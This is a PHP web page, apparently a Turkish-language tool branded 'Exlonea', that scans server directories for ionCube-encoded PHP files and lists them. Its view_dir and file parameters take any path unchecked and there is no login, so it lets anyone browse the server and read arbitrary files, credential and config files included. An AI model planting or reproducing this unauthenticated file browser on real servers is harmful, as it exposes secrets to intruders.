<?php
// Hata raporlamayı etkinleştir
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Şifreli dosyaları saklamak için dizi
$encrypted_files = [];

// Seçilen dizinin içeriğini listeleyen fonksiyon
function listDirectoryContents($dir) {
    $contents = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $contents[] = [
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'directory' : 'file'
        ];
    }
    return $contents;
}

// Şifreli dosyaları tarayan fonksiyon
function scanDirectory($dir) {
    global $encrypted_files;
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            scanDirectory($path); // Alt dizinleri tara
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php') {
            $content = file_get_contents($path);
            if (isIonCubeEncrypted($content)) {
                $encrypted_files[] = $path;
            }
        }
    }
}

// ionCube şifrelemesini kontrol eden fonksiyon
function isIonCubeEncrypted($content) {
    // ionCube imzasını kontrol et
    if (preg_match('/ionCube/i', $content)) {
        return true;
    }
    // __halt_compiler ve ardından okunamaz veri bloğu kontrolü
    if (strpos($content, '__halt_compiler') !== false) {
        $binary_data = substr($content, strpos($content, '__halt_compiler') + strlen('__halt_compiler'));
        // Okunamaz veri bloğu içerip içermediğini kontrol et
        return preg_match('/[\x00-\x1F\x7F-\xFF]{100,}/', $binary_data);
    }
    // Dosyanın açık kaynak PHP olup olmadığını kontrol et
    if (preg_match('/<\?php\s*(return\s*array|class|function|if|foreach|while|\$[\w]+\s*=)/i', $content)) {
        // Açık kaynak PHP dosyası (örneğin, dil dosyaları veya config dosyaları)
        return false;
    }
    // Dosyanın büyük oranda okunamaz baytlar içerip içermediğini kontrol et
    $total_length = strlen($content);
    if ($total_length == 0) {
        return false;
    }
    // UTF-8 karakterlerini hariç tutarak yalnızca kontrol karakterlerini say
    $binary_length = strlen(preg_replace('/[\p{L}\p{N}\p{P}\p{S}\s]/u', '', $content));
    if ($binary_length / $total_length > 0.7) { // %70'ten fazla okunamazsa şifreli kabul et
        return true;
    }
    return false;
}

// URL oluşturma fonksiyonu
function getFileUrl($file_path, $base_dir) {
    $relative_path = str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file_path);
    return 'http://' . $_SERVER['HTTP_HOST'] . '/' . str_replace(DIRECTORY_SEPARATOR, '/', $relative_path);
}

// Breadcrumb oluşturma fonksiyonu
function generateBreadcrumb($path, $base_dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = [
            'name' => $part,
            'path' => $current_path
        ];
    }
    return $breadcrumb;
}

// Varsayılan olarak kök dizin
$base_dir = $_SERVER['DOCUMENT_ROOT'];
$current_file = __FILE__;
$current_dir = dirname($current_file);
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="no-underline">🖥️ Exlonea 🖥️</a></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 1rem;
            box-sizing: border-box;
        }
        .container {
            max-width: 100%;
            margin: 0 auto;
            padding: 0 0.5rem;
        }
        .error {
            color: red;
            font-size: 0.9rem;
        }
        .success {
            color: green;
            font-size: 0.9rem;
        }
        .result {
            margin-top: 1rem;
        }
        textarea {
            width: 100%;
            margin-top: 0.5rem;
            height: 30vh;
            font-family: monospace;
            font-size: 0.85rem;
            box-sizing: border-box;
            resize: vertical;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            padding: 0.3rem 0;
            font-size: 0.9rem;
        }
        a {
            text-decoration: none;
            color: #007bff;
        }
        a:hover {
            text-decoration: underline;
        }
        .no-underline, .no-underline:hover {
            text-decoration: none;
        }
        .file-actions {
            margin-top: 0.5rem;
        }
        .file-actions button, .scan-button {
            padding: 0.5rem 1rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 0.25rem;
            cursor: pointer;
            font-size: 0.9rem;
            width: 100%;
            max-width: 200px;
        }
        .file-actions button:hover, .scan-button:hover {
            background-color: #0056b3;
        }
        .breadcrumb {
            margin-bottom: 1rem;
            font-size: 0.8rem;
            overflow-x: auto;
            white-space: nowrap;
        }
        .breadcrumb a {
            margin-right: 0.3rem;
        }
        .directory-list {
            margin-top: 1rem;
        }
        .directory-list h3 {
            margin-bottom: 0.5rem;
            font-size: 1rem;
        }
        .directory-list ul {
            border: 1px solid #ddd;
            padding: 0.5rem;
            border-radius: 0.25rem;
        }
        .directory-list li.directory a {
            font-weight: bold;
        }
        .footer {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.8rem;
            color: #808080;
        }
        .footer a {
            color: #808080;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: none;
        }

        @media (max-width: 768px) {
            body {
                padding: 0.5rem;
            }
            h2 {
                font-size: 1.2rem;
            }
            .container {
                padding: 0 0.3rem;
            }
            textarea {
                font-size: 0.75rem;
                height: 25vh;
            }
            .file-actions button, .scan-button {
                font-size: 0.8rem;
                padding: 0.4rem 0.8rem;
            }
            .breadcrumb {
                font-size: 0.7rem;
            }
            .directory-list h3 {
                font-size: 0.9rem;
            }
            li {
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="no-underline">🖥️ Exlonea 🖥️</a></h2>
        
        <!-- Breadcrumb -->
        <div class="breadcrumb">
            <strong>Geçerli Konum:</strong>
            <?php
            $breadcrumb = generateBreadcrumb($current_file, $base_dir);
            foreach ($breadcrumb as $index => $item) {
                if ($index > 0) echo ' / ';
                echo '<a href="?view_dir=' . urlencode($item['path']) . '">' . htmlspecialchars($item['name']) . '</a>';
            }
            ?>
        </div>

        <!-- Dizin İçeriği -->
        <?php
        $view_dir = isset($_GET['view_dir']) ? $_GET['view_dir'] : $current_dir;
        if (is_dir($view_dir)) {
            echo '<div class="directory-list">';
            echo '<h3>Seçilen Dizin: ' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $view_dir)) . '</h3>';
            echo '<form method="post">';
            echo '<input type="hidden" name="directory" value="' . htmlspecialchars($view_dir) . '">';
            echo '<button type="submit" name="scan" class="scan-button">Taramayı Başlat</button>';
            echo '</form>';
            $contents = listDirectoryContents($view_dir);
            if (!empty($contents)) {
                echo '<ul>';
                foreach ($contents as $item) {
                    $icon = $item['type'] === 'directory' ? '📁 ' : '📄 ';
                    echo '<li class="' . $item['type'] . '"><a href="?view_dir=' . urlencode($item['type'] === 'directory' ? $item['path'] : $item['path'] . '&file=' . urlencode($item['path'])) . '">' . $icon . htmlspecialchars($item['name']) . '</a></li>';
                }
                echo '</ul>';
            } else {
                echo '<p>Bu dizinde içerik bulunamadı.</p>';
            }
            echo '</div>';
        }
        ?>

        <!-- Tarama Sonuçları -->
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['scan']) && !empty($_POST['directory'])) {
            $directory = rtrim($_POST['directory'], '/\\');
            
            // Dizin var mı ve erişilebilir mi kontrol et
            if (!is_dir($directory)) {
                echo '<p class="error">Hata: Geçersiz veya erişilemeyen dizin yolu!</p>';
            } else {
                // Taramayı başlat
                $encrypted_files = []; // Diziyi sıfırla
                scanDirectory($directory);
                
                // Sonuçları göster
                echo '<div class="result">';
                if (empty($encrypted_files)) {
                    echo '<p class="success">Şifreli dosya bulunamadı!</p>';
                } else {
                    echo '<h3>Bulunan Şifreli Dosyalar:</h3>';
                    echo '<ul>';
                    foreach ($encrypted_files as $file) {
                        echo '<li><a href="?file=' . urlencode($file) . '">' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file)) . '</a></li>';
                    }
                    echo '</ul>';
                }
                echo '</div>';
            }
        }

        // Dosya içeriğini göster ve "Dosyaya Git" butonu ekle
        if (isset($_GET['file']) && is_file($_GET['file'])) {
            $file_path = $_GET['file'];
            echo '<h3>Dosya İçeriği: ' . htmlspecialchars(str_replace($base_dir . DIRECTORY_SEPARATOR, '', $file_path)) . '</h3>';
            echo '<textarea readonly>' . htmlspecialchars(file_get_contents($file_path)) . '</textarea>';
            echo '<div class="file-actions">';
            echo '<a href="' . htmlspecialchars(getFileUrl($file_path, $base_dir)) . '" target="_blank"><button>Dosyaya Git</button></a>';
            echo '</div>';
        }
        ?>
        <div class="footer">
            <a href="https://t.me/Exlonea" class="no-underline">Copyright © Exlonea - 2025</a>
        </div>
    </div>
</body>
</html>